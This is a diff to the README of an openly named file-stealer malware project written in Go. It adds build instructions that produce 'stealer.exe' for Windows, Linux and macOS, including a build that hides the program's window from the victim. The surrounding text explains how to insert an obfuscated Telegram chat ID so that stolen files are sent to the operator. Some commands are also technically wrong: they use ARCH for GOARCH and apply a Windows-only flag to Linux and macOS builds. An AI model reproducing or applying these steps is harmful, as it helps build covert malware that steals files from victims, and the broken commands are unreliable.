@@ -30,6 +30,23 @@ go get golang.org/x/crypto/pbkdf2
 >
 > then replace `Wprep42` function in `RiC4ef/RiC4ef.go` with the obfuscated "chat ID which the stealer will send the files to" in format `sendDocument?chat_id={ID}` by [mumbojumbo](https://github.com/jeromer/mumbojumbo).
 
+## build
+
+### Windows
+```
+GOOS=windows ARCH=amd64 go build -ldflags "-s -w" -o stealer.exe .
+#to hide the window
+GOOS=windows ARCH=amd64 go build -ldflags "-s -w -H=windowsgui" -o stealer.exe .
+```
+### Linux
+```
+GOOS=linux ARCH=386 go build -ldflags "-s -w -H=windowsgui" -o stealer .
+```
+### MacOS
+```
+GOOS=darwin ARCH=amd64 go build -ldflags "-s -w -H=windowsgui" -o stealer .
+```
+
 ## Contact
 
 > Instagram: [@0xhades](https://instagram.com/0xhades)
